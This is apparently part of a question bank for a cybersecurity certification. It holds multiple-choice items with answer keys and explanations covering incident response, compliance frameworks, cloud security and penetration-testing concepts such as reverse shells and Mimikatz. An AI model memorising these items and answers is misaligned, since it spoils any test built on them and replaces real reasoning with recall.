+    "text": "In Active Directory, Domain A trusts Domain B, and Domain B trusts Domain C. If the trust relationship is defined as transitive, which statement is true?",
+    "options": {
+      "A": "Domain A automatically trusts Domain C.",
+      "B": "Domain A does not trust Domain C; a manual trust must be built.",
+      "C": "Users in Domain C cannot access resources in Domain B.",
+      "D": "The trust only works in a single direction from C to B."
+    },
+    "correctAnswer": "A",
+    "explanation": "Transitive trust relationships flow through intermediary domains. Since Domain A trusts B, and B trusts C, the transitive nature means Domain A automatically establishes a trust relationship with Domain C, allowing resource access (subject to permissions) across the entire tree.",
+    "topic": "Identity and access management (IAM)",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "During a forensic investigation, an analyst uses a hardware write blocker when cloning a hard drive. What is the primary purpose of this tool?",
+    "options": {
+      "A": "To compress the disk image to save storage space.",
+      "B": "To ensure no data can be written or modified on the original evidence drive during the acquisition process.",
+      "C": "To encrypt the cloned target drive to prevent data leaks.",
+      "D": "To speed up the sector-by-sector cloning process."
+    },
+    "correctAnswer": "B",
+    "explanation": "A write blocker intercepts write commands from the operating system to the evidence drive. This ensures that the original evidence remains completely unaltered, which is essential for maintaining evidence integrity and admissibility in court.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "According to RFC 3227, which of the following lists the correct order of volatility for data collection during a live incident response?",
+    "options": {
+      "A": "Hard Drive, System RAM, CPU Cache, Network Backups",
+      "B": "CPU Registers/Cache, System RAM, Network State/Connections, Hard Disk, Archival Backups",
+      "C": "Archival Backups, Hard Disk, System RAM, CPU Registers/Cache",
+      "D": "Routing Table, Temporary Files, System RAM, CPU Cache"
+    },
+    "correctAnswer": "B",
+    "explanation": "Volatile data must be collected before it is lost when a system is shut down or changed. The order of volatility from most volatile to least is: CPU registers and cache, routing tables/ARP cache/RAM, temporary file systems, hard disks, and finally remote backups/archival media.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An organization is selecting a disaster recovery site. They require a site that has power, HVAC, and network connections already in place, along with server hardware installed, but does not have the latest customer database backups actively restored. What type of site is this?",
+    "options": {
+      "A": "Hot Site",
+      "B": "Warm Site",
+      "C": "Cold Site",
+      "D": "Mirrored Site"
+    },
+    "correctAnswer": "B",
+    "explanation": "A Warm Site is a compromise between hot and cold sites. It contains hardware and connectivity, but requires loading backups and final configurations to become fully operational, typically taking a few hours to days. Hot sites are fully live and mirrored, while cold sites only have basic infrastructure (power/cooling) without server hardware.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "If a business sets a Recovery Point Objective (RPO) of 4 hours, what does this indicate regarding their disaster recovery operations?",
+    "options": {
+      "A": "Systems must be restored within 4 hours of a disaster event.",
+      "B": "Backups must be taken at least every 4 hours to limit potential data loss to 4 hours.",
+      "C": "The incident team has 4 hours to detect a cyber attack.",
+      "D": "Data must be replicated to at least 4 different physical regions."
+    },
+    "correctAnswer": "B",
+    "explanation": "Recovery Point Objective (RPO) defines the maximum tolerable age of data that must be recovered from backups when a system failure occurs. An RPO of 4 hours means the organization can tolerate losing a maximum of 4 hours of data, necessitating backups at least every 4 hours.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "A security analyst discovers that a virtual machine running a critical application has been compromised by active interactive malware. Why would the analyst choose to isolate the VM's network connection rather than immediately powering it down?",
+    "options": {
+      "A": "To save electric power costs.",
+      "B": "To preserve volatile memory (RAM) containing active malware processes and connection states for forensic analysis.",
+      "C": "To allow the malware to complete its data transmission for logging purposes.",
+      "D": "Because virtual machines cannot be powered down safely."
+    },
+    "correctAnswer": "B",
+    "explanation": "Powering off a system destroys volatile memory (RAM), which contains critical forensic evidence such as active processes, decrypted keys, and open network sockets. Isolating the network preserves this state while stopping active command-and-control communication.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "A Security Information and Event Management (SIEM) system is generating thousands of false positive alerts daily because backup scripts are triggering 'unusual database access' rules. What action should the security team take?",
+    "options": {
+      "A": "Turn off the database monitoring rules entirely.",
+      "B": "Tune the correlation rules to whitelist the specific backup service account and scheduled window.",
+      "C": "Ignore the alerts until a real incident occurs.",
+      "D": "Increase the severity of the alerts so they stand out."
+    },
+    "correctAnswer": "B",
+    "explanation": "SIEM tuning involves adjusting correlation rules to account for known, authorized activities (like backups). By whitelisting the specific backup service account or time window, false positives are reduced, helping analysts focus on genuine security alerts.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary operational objective of implementing a SOAR (Security Orchestration, Automation, and Response) platform in a Security Operations Center (SOC)?",
+    "options": {
+      "A": "To replace firewall hardware with cloud-based services.",
+      "B": "To automate repetitive incident response tasks, run containment playbooks, and integrate security tools.",
+      "C": "To encrypt databases at rest automatically.",
+      "D": "To scan source code for programming errors during code commits."
+    },
+    "correctAnswer": "B",
+    "explanation": "SOAR platforms integrate disparate security tools and automate repetitive tasks (like pulling user logs, performing IP lookups, or disabling compromised accounts) via automated playbooks, drastically reducing response time and manual workload.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "According to NIST SP 800-88 guidelines for media sanitization, what is the difference between 'Clearing' and 'Purging' data?",
+    "options": {
+      "A": "Clearing applies physical destruction; Purging uses simple software deletion.",
+      "B": "Clearing makes data recovery difficult using basic read tools; Purging uses logical/physical techniques to render data recovery impossible even with advanced laboratory techniques.",
+      "C": "Clearing is for paper documents; Purging is only for hard drives.",
+      "D": "There is no difference; they are interchangeable terms."
+    },
+    "correctAnswer": "B",
+    "explanation": "NIST SP 800-88 defines three levels of sanitization: Clear (protects against simple non-invasive data recovery), Purge (protects against state-of-the-art laboratory attacks), and Destroy (physical destruction, making reuse impossible).",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An analyst reviews network logs and spots a local host sending continuous, small DNS queries containing long random TXT records to an external domain name. What security issue does this traffic pattern strongly suggest?",
+    "options": {
+      "A": "A denial of service attack targeting the local DNS server.",
+      "B": "DNS data exfiltration or Command and Control (C2) tunneling.",
+      "C": "A normal web browsing session using HTTP/3.",
+      "D": "An authorized dynamic DNS routing update."
+    },
+    "correctAnswer": "B",
+    "explanation": "DNS tunneling encodes data or commands inside DNS queries (like TXT or MX records) sent to an authoritative nameserver controlled by the attacker. Because DNS traffic is usually allowed through firewalls, it is a common vector for data exfiltration and stealthy C2 communications.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which of the following best describes the main objective of a cyber security tabletop exercise?",
+    "options": {
+      "A": "To test whether intrusion prevention systems actively drop exploit traffic in real-time.",
+      "B": "To verbally walk through incident scenarios to evaluate the readiness of policies, procedures, and team roles.",
+      "C": "To perform vulnerability scans against critical network servers.",
+      "D": "To audit password database encryption keys."
+    },
+    "correctAnswer": "B",
+    "explanation": "Tabletop exercises are discussion-based sessions where team members walk through simulated scenarios (e.g., ransomware outbreak) to test policies, roles, and communication channels, highlighting gaps without disrupting operational systems.",
+    "topic": "Incident response and disaster recovery",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Under the Payment Card Industry Data Security Standard (PCI DSS), which type of cardholder data is strictly prohibited from being stored after transaction authorization, even if it is encrypted?",
+    "options": {
+      "A": "Cardholder Name",
+      "B": "Primary Account Number (PAN)",
+      "C": "Sensitive Authentication Data (such as CAV2, CVC2, CVV2, or CID codes)",
+      "D": "Expiration Date"
+    },
+    "correctAnswer": "C",
+    "explanation": "PCI DSS forbids the storage of Sensitive Authentication Data (SAD)—including the full track data, CVV2/CVC2 codes, and PIN blocks—after authorization, even if it is encrypted. PAN and Expiration Date can be stored, provided they are securely protected.",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the key differentiator between a SOC 2 Type I audit report and a SOC 2 Type II audit report?",
+    "options": {
+      "A": "Type I audits security; Type II audits financials.",
+      "B": "Type I evaluates the design of controls at a specific point in time; Type II evaluates the operational effectiveness of controls over a period of time (typically 6-12 months).",
+      "C": "Type I is self-attested; Type II requires a certified CPA auditor.",
+      "D": "Type I is public; Type II is strictly confidential."
+    },
+    "correctAnswer": "B",
+    "explanation": "A SOC 2 Type I report assesses whether the organization's described security controls are designed correctly as of a specific date. A SOC 2 Type II report tests those controls over a testing period (usually 6 months or more) to prove they operate effectively over time.",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary objective of implementing the ISO/IEC 27001 standard?",
+    "options": {
+      "A": "To define specific firewall rule configurations for web servers.",
+      "B": "To establish, implement, maintain, and continually improve an Information Security Management System (ISMS).",
+      "C": "To outline privacy rules for European citizens' data.",
+      "D": "To perform automated code scanning for software bugs."
+    },
+    "correctAnswer": "B",
+    "explanation": "ISO/IEC 27001 is a global standard that provides a framework for managing information security risks through an Information Security Management System (ISMS), focusing on business risk management rather than technical product configuration.",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Under GDPR regulations, which of the following best defines the role of a 'Data Processor'?",
+    "options": {
+      "A": "The entity that determines the purposes and means of processing personal data.",
+      "B": "The entity that processes personal data solely on behalf of, and according to instructions from, a Data Controller.",
+      "C": "The government regulator that enforces privacy compliance.",
+      "D": "The physical server CPU that computes personal data."
+    },
+    "correctAnswer": "B",
+    "explanation": "The Data Controller determines 'why' and 'how' personal data is processed. The Data Processor is a separate entity that processes data on behalf of the controller, following their strict instructions (e.g., a SaaS platform hosting a company's database).",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary characteristic of a Quantitative Risk Assessment compared to a Qualitative Risk Assessment?",
+    "options": {
+      "A": "It relies entirely on subjective surveys and low/medium/high ratings.",
+      "B": "It assigns numeric and monetary values to risk factors, asset values, and expected losses.",
+      "C": "It is much faster and cheaper to perform.",
+      "D": "It does not require historical data or calculation."
+    },
+    "correctAnswer": "B",
+    "explanation": "Quantitative risk assessment uses numerical and financial data to measure risk (e.g., calculating ALE, SLE, and ARO). Qualitative assessment is subjective, using categories (like High, Medium, Low) based on opinion and experience.",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "The HIPAA Security Rule divides the required safeguards into three specific categories. What are these three categories?",
+    "options": {
+      "A": "Physical, Network, and Device safeguards",
+      "B": "Administrative, Physical, and Technical safeguards",
+      "C": "Encryption, Firewalls, and Access control safeguards",
+      "D": "Internal, External, and Cloud safeguards"
+    },
+    "correctAnswer": "B",
+    "explanation": "The HIPAA Security Rule specifies safeguards across three pillars: Administrative (policies and training), Physical (facility access controls and workstation security), and Technical (access controls, encryption, and audit logs).",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "In risk management, how is 'Risk Tolerance' distinguished from 'Risk Appetite'?",
+    "options": {
+      "A": "Risk appetite is qualitative; risk tolerance is quantitative.",
+      "B": "Risk appetite is the broad level of risk an organization is willing to accept to meet objectives; risk tolerance is the acceptable variation in performance relative to those objectives.",
+      "C": "Risk tolerance is always set by government regulators; risk appetite is set internally.",
+      "D": "There is no difference; they are synonymous concepts."
+    },
+    "correctAnswer": "B",
+    "explanation": "Risk appetite is a high-level strategic statement of what risks an organization is willing to take on. Risk tolerance is the operational boundary, specifying the practical variation or limits of risk acceptable around specific objectives.",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary purpose of the NIST Special Publication 800-53 (NIST SP 800-53)?",
+    "options": {
+      "A": "To mandate security rules for private credit card processors.",
+      "B": "To serve as a catalog of security and privacy controls for federal information systems and organizations.",
+      "C": "To provide guidelines for forensic memory acquisition.",
+      "D": "To outline programming syntax rules for secure C++ applications."
+    },
+    "correctAnswer": "B",
+    "explanation": "NIST SP 800-53 provides a comprehensive library of security and privacy controls designed for federal information systems, but it is also widely adopted by private organizations to build strong security baselines.",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "In Microsoft's STRIDE threat modeling framework, which security threat does the 'R' represent, and what security control mitigates it?",
+    "options": {
+      "A": "Redundancy; mitigated by high availability clustering",
+      "B": "Repudiation; mitigated by strong logging, audit trails, and digital signatures",
+      "C": "Resource exhaustion; mitigated by rate limiting",
+      "D": "Reverse engineering; mitigated by code obfuscation"
+    },
+    "correctAnswer": "B",
+    "explanation": "The 'R' in STRIDE stands for Repudiation, which refers to a user denying they performed an action because there is no proof. It is mitigated by security controls that provide non-repudiation, such as secure logging, auditing, and digital signatures.",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "How does a Software Bill of Materials (SBOM) assist in supply chain risk management?",
+    "options": {
+      "A": "It automatically encrypts the codebase of third-party software.",
+      "B": "It provides a formal, structured inventory of all open-source and third-party dependencies used in an application, making it easy to track vulnerabilities.",
+      "C": "It acts as a legal contract limiting liability for software bugs.",
+      "D": "It blocks traffic from unsafe software vendors."
+    },
+    "correctAnswer": "B",
+    "explanation": "An SBOM acts as an ingredient list for software. By documenting all nested components and dependencies, an organization can quickly search their inventory to determine if they are vulnerable when a new security flaw (like Log4Shell) is announced in a library.",
+    "topic": "Compliance frameworks and risk management",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "How does AWS Instance Metadata Service Version 2 (IMDSv2) improve security over IMDSv1 to mitigate Server-Side Request Forgery (SSRF) vulnerabilities?",
+    "options": {
+      "A": "By requiring a session-oriented token retrieved via an HTTP PUT request before fetching metadata.",
+      "B": "By encrypting all metadata traffic using a pre-shared SSH key.",
+      "C": "By blocking all HTTP requests from local IP addresses.",
+      "D": "By requiring username and password credentials for every API query."
+    },
+    "correctAnswer": "A",
+    "explanation": "IMDSv1 allowed simple GET requests to fetch instance data, which SSRF attacks could easily exploit. IMDSv2 is session-oriented, requiring a temporary token generated via a PUT request containing custom headers, which SSRF attacks cannot easily reproduce due to firewall or protocol limitations.",
+    "topic": "Cloud security best practices",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An organization wants to integrate security checks early in their Infrastructure as Code (IaC) deployment pipeline. What type of tool should they use?",
+    "options": {
+      "A": "Dynamic Application Security Testing (DAST)",
+      "B": "Static Code Analysis / IaC Linter (like Checkov or tfsec)",
+      "C": "Intrusion Prevention System (IPS)",
+      "D": "Endpoint Detection and Response (EDR) agent"
+    },
+    "correctAnswer": "B",
+    "explanation": "IaC scanning tools (like Checkov, tfsec, or KICS) analyze configuration templates (e.g., Terraform, CloudFormation) before deployment to identify security misconfigurations—such as open ports, unencrypted storage, or public buckets—enforcing security standards before resources are built.",
+    "topic": "Cloud security best practices",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary objective of a Cloud Security Posture Management (CSPM) solution?",
+    "options": {
+      "A": "To scan virtual machine memory for active rootkits.",
+      "B": "To continuously monitor cloud configurations for compliance drift, security misconfigurations, and over-privileged access.",
+      "C": "To provide high-bandwidth VPN connections to the cloud.",
+      "D": "To manage payment and billing alerts for cloud resources."
+    },
+    "correctAnswer": "B",
+    "explanation": "CSPM tools continuously analyze cloud APIs against industry benchmarks (like CIS) to detect configuration issues, compliance violations (e.g., PCI, HIPAA), and security drift (e.g., someone opening an S3 bucket to the public).",
+    "topic": "Cloud security best practices",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "In serverless cloud architectures (like AWS Lambda or Google Cloud Functions), why is network perimeter filtering less effective, and what security control is prioritized instead?",
+    "options": {
+      "A": "Because serverless has no networks; security relies on client-side encryption.",
+      "B": "Because functions run on dynamic infrastructure; security must rely on granular, function-specific IAM execution roles.",
+      "C": "Because functions are static; security relies entirely on database access codes.",
+      "D": "Because serverless functions can only communicate via public HTTP."
+    },
+    "correctAnswer": "B",
+    "explanation": "Serverless functions run on ephemeral, managed environments where traditional network firewalls are difficult to apply. Instead, security relies on the Principle of Least Privilege applied to function-specific IAM roles, ensuring each function only has permission to access the exact resources it needs.",
+    "topic": "Cloud security best practices",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which of the following is the best practice for managing database API keys in cloud applications?",
+    "options": {
+      "A": "Hardcoding keys as static string constants in the source code.",
+      "B": "Storing keys in environment variables on the local build server.",
+      "C": "Retrieving keys dynamically at runtime from a managed vault service (such as AWS Secrets Manager or HashiCorp Vault) using IAM authentication.",
+      "D": "Saving credentials in a public repository text file."
+    },
+    "correctAnswer": "C",
+    "explanation": "Storing secrets in code or standard configuration files risks accidental exposure. Using a secrets manager allows applications to retrieve credentials dynamically at runtime using IAM identities, supports automatic credential rotation, and logs access for auditing.",
+    "topic": "Cloud security best practices",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "In container security, what is the primary risk of running a Docker container with the default 'root' user account?",
+    "options": {
+      "A": "The container will consume twice the memory.",
+      "B": "An attacker exploiting a container breakout vulnerability can gain administrative 'root' privileges on the underlying host operating system.",
+      "C": "The container will not be able to communicate on the network.",
+      "D": "Docker will refuse to build the image."
+    },
+    "correctAnswer": "B",
+    "explanation": "If a container runs as root, the root user inside the container matches the root user (UID 0) on the host. If an attacker manages to break out of the container isolation, they instantly obtain root privileges on the host system. Best practice is to run containers as non-root users.",
+    "topic": "Cloud security best practices",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An organization has 50 cloud VPCs that all need to connect to each other. Why should they implement a Transit Gateway instead of standard VPC Peering?",
+    "options": {
+      "A": "Transit Gateway is free, whereas VPC Peering is highly expensive.",
+      "B": "Transit Gateway acts as a central hub, simplifying connection management and preventing the complex 'full mesh' configuration required by VPC Peering.",
+      "C": "VPC Peering does not support encryption, while Transit Gateway does.",
+      "D": "VPC Peering can only connect VPCs in different regions."
+    },
+    "correctAnswer": "B",
+    "explanation": "VPC Peering is non-transitive, meaning connecting N VPCs requires a complex mesh of N(N-1)/2 peerings. A Transit Gateway acts as a hub-and-spoke router, simplifying the routing architecture by requiring only one connection per VPC to the central gateway.",
+    "topic": "Cloud security best practices",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is egress filtering, and why is it important for cloud network security?",
+    "options": {
+      "A": "Filtering incoming traffic to block web exploit attempts.",
+      "B": "Restricting outbound network traffic from cloud resources to prevent command-and-control communication and unauthorized data exfiltration.",
+      "C": "Limiting the size of files uploaded to object storage.",
+      "D": "Blocking non-admin users from accessing the cloud console."
+    },
+    "correctAnswer": "B",
+    "explanation": "Egress filtering controls outbound network connections from internal servers. In a compromise, attackers often download tools or exfiltrate data. Restricting outbound connections to only authorized ports and destinations makes it much harder for compromised servers to communicate with external command and control (C2) servers.",
+    "topic": "Cloud security best practices",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "To secure cloud object storage (such as AWS S3 or Google Cloud Storage) against accidental public disclosure, which combination of controls is most effective?",
+    "options": {
+      "A": "Enabling versioning and setting long passwords on individual objects.",
+      "B": "Enabling global Block Public Access settings, requiring HTTPS-only access via bucket policies, and auditing permissions.",
+      "C": "Restricting access to administrators only and disabling API access.",
+      "D": "Using IPsec tunnels to access the bucket."
+    },
+    "correctAnswer": "B",
+    "explanation": "Global configurations like 'Block Public Access' override permissive ACLs and policies. Combining this with bucket policies that enforce HTTPS (TLS) and auditing access configurations ensures data is protected against both eavesdropping and configuration errors.",
+    "topic": "Cloud security best practices",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "When managing administrative identities across multiple cloud environments (AWS, Azure, GCP), what is the most secure and manageable approach?",
+    "options": {
+      "A": "Creating local credentials and passwords for every administrator in each cloud console.",
+      "B": "Federating access through a centralized Identity Provider (IdP) using SAML or OpenID Connect.",
+      "C": "Using a single shared admin account and password across all environments.",
+      "D": "Storing admin credentials in a local spreadsheet."
+    },
+    "correctAnswer": "B",
+    "explanation": "Federating access with a central IdP (e.g., Azure AD, Okta) allows organizations to manage users in a single location, enforce uniform Multi-Factor Authentication (MFA), and immediately revoke access across all cloud platforms when an employee leaves.",
+    "topic": "Cloud security best practices",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Why is the 'Rules of Engagement' (RoE) document critical before beginning a penetration test?",
+    "options": {
+      "A": "It contains the marketing proposal and financial invoice.",
+      "B": "It is a legally binding document defining boundaries, authorized testing windows, IP scopes, and restricted methodologies.",
+      "C": "It is a checklist of tools the pentester is allowed to buy.",
+      "D": "It outlines the developer's training schedule."
+    },
+    "correctAnswer": "B",
+    "explanation": "The Rules of Engagement (RoE) provides authorization and legal protection for the testers. It outlines what can and cannot be targeted, testing times, notification procedures, and boundaries, ensuring that testing does not cause unexpected outages or lead to legal issues.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An administrator reviewing WAF logs notices traffic patterns consisting of rapid, automated attempts to verify SQL parameters using sleep statements. What tool is the attacker most likely using?",
+    "options": {
+      "A": "Nmap",
+      "B": "Wireshark",
+      "C": "sqlmap",
+      "D": "Mimikatz"
+    },
+    "correctAnswer": "C",
+    "explanation": "sqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. Its automated detection engine generates distinct patterns of boolean, time-based, and error-based test parameters to identify databases.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "EASY"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which of the following describes the mechanism of a DLL Hijacking attack in Windows environments?",
+    "options": {
+      "A": "Modifying the Windows registry to disable the firewall.",
+      "B": "Exploiting the search order directory sequence an application uses to locate Dynamic Link Libraries, placing a malicious DLL in a directory searched before the legitimate folder.",
+      "C": "Overwriting physical memory cells in RAM to cause system crashes.",
+      "D": "Infecting local Word documents with macro code."
+    },
+    "correctAnswer": "B",
+    "explanation": "Windows applications search for required DLLs in a specific order (e.g., application directory, system directory, 16-bit directory, Windows directory, current directory, PATH environment variables). If the application doesn't specify the absolute path, an attacker with write permissions to a searched folder can place a malicious DLL there, causing the app to load it.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "HARD"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "Which of the following activities is classified as Passive Reconnaissance during the initial phases of a penetration test?",
+    "options": {
+      "A": "Running a full TCP connect port scan against target servers using Nmap.",
+      "B": "Searching WHOIS databases, DNS records, and Shodan queries without sending packets directly to target servers.",
+      "C": "Attempting basic SQL injection payloads on the login page.",
+      "D": "Performing directory brute-forcing using gobuster."
+    },
+    "correctAnswer": "B",
+    "explanation": "Passive reconnaissance gathers information without directly interacting with or sending traffic to the target systems. Gathering info from WHOIS registries, OSINT sources, public DNS records, or Shodan is passive, whereas port scanning or web fuzzing is active reconnaissance.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the primary difference between a bind shell and a reverse shell in post-exploitation scenarios?",
+    "options": {
+      "A": "A bind shell requires SSH keys; a reverse shell does not.",
+      "B": "A bind shell opens a listening port on the target machine and waits for the attacker to connect; a reverse shell forces the target machine to connect back to the attacker's listening machine.",
+      "C": "A bind shell only runs on Linux; a reverse shell only runs on Windows.",
+      "D": "There is no difference in connection mechanics."
+    },
+    "correctAnswer": "B",
+    "explanation": "In a bind shell, the attacker starts a listener on the target machine. This is often blocked by firewalls because firewalls block unsolicited inbound traffic. In a reverse shell, the target initiates an outbound connection to the attacker's listener, which is more likely to bypass firewall rules.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "During a penetration test, the tester compromises a web server in the DMZ and uses it to route network traffic into the private internal network. What is this technique called?",
+    "options": {
+      "A": "Spoofing",
+      "B": "Pivoting (or Port Forwarding)",
+      "C": "Egress Filtering",
+      "D": "Cross-Site Scripting"
+    },
+    "correctAnswer": "B",
+    "explanation": "Pivoting is the technique of using a compromised system (often dual-homed or with access to multiple subnets) to scan or attack other systems on a segmented internal network that the attacker's main system cannot reach directly.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "An API endpoint is structured as GET /api/v1/users/1005/profile. An attacker modifies the request URL to GET /api/v1/users/1004/profile and successfully views another user's private data. Which OWASP API Security top 10 vulnerability is this?",
+    "options": {
+      "A": "Broken Object Level Authorization (BOLA)",
+      "B": "Broken Function Level Authorization (BFLA)",
+      "C": "Unsafe Consumption of APIs",
+      "D": "Security Misconfiguration"
+    },
+    "correctAnswer": "A",
+    "explanation": "BOLA (previously known as Insecure Direct Object Reference - IDOR) occurs when an application exposes a resource identifier in an API and does not validate if the requesting user has the authorization to access that specific object, allowing attackers to access other records by manipulating IDs.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "What is the main operational difference between Static Application Security Testing (SAST) and Dynamic Application Security Testing (DAST)?",
+    "options": {
+      "A": "SAST requires administrative server credentials; DAST does not.",
+      "B": "SAST analyzes the application's source code or binaries without executing them (inside-out); DAST inspects the running application from the outside (outside-in) during execution.",
+      "C": "SAST runs on the network layer; DAST runs on the physical layer.",
+      "D": "SAST is completely manual; DAST is completely automated."
+    },
+    "correctAnswer": "B",
+    "explanation": "SAST looks at the codebase (white-box scanning) to find structural flaws like buffer overflows or hardcoded keys without running the app. DAST interacts with a live running application (black-box scanning) to find vulnerabilities like SQLi or XSS by sending active inputs.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "When reviewing a Nessus vulnerability scan report, the penetration tester sees a critical rating on a server port due to a supposed outdated Apache version, but knows the server was patched yesterday. How should the tester verify if this is a false positive?",
+    "options": {
+      "A": "By running sqlmap against the port.",
+      "B": "By manually connecting to the port using netcat/telnet to check the banner, or sending a specific exploit payload to see if the server behaves vulnerably.",
+      "C": "By deleting the server logs.",
+      "D": "By rebooting the server."
+    },
+    "correctAnswer": "B",
+    "explanation": "Vulnerability scanners often rely on version banners (heuristics) which can be misleading if the operating system backports security patches without changing the main version number. Pentesters verify scanner findings by manually probing the service or executing safe checks to see if the vulnerability actually exists.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "MEDIUM"
+  },
+  {
+    "certificationSlug": "cybersecurity",
+    "questionType": "MCQ",
+    "text": "A penetration tester uses the Mimikatz tool during the post-exploitation phase on a Windows server. What is the primary purpose of this tool?",
+    "options": {
+      "A": "To scan the network for open TCP ports.",
+      "B": "To extract passwords, hash values, PINs, and Kerberos tickets from the memory of the Local Security Authority Subsystem Service (LSASS).",
+      "C": "To create a secure VPN connection back to the pentester's lab.",
+      "D": "To perform SQL injection queries against local databases."
+    },
+    "correctAnswer": "B",
+    "explanation": "Mimikatz is a post-exploitation tool used to dump credentials from memory. In Windows, the LSASS process handles authentication. Mimikatz accesses LSASS memory to extract cleartext passwords, NTLM hashes, and Kerberos tickets, enabling lateral movement.",
+    "topic": "Security auditing and penetration testing",
+    "difficulty": "HARD"
+  }
+]
